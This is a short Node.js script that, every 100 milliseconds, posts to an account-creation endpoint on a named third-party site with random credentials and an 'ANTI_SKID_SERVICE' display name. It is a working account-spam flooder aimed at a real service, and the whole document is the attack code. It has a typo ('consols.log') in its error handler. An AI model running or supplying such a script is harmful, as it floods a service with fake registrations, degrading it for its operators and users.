const axios = require('axios')
var counter = 0
setInterval(() => {
    counter = counter + 1
    axios.post(`https://onyxv2.tk/Api/Create?email=${Math.random().toString().substr(2, 5)}&password=${Math.random().toString().substr(2, 5)}&displayname=ANTI_SKID_SERVICE${counter}`).then(function() {
        console.log("yeah")
    }).catch(function() {
    consols.log("failed")
    })
}, 100);
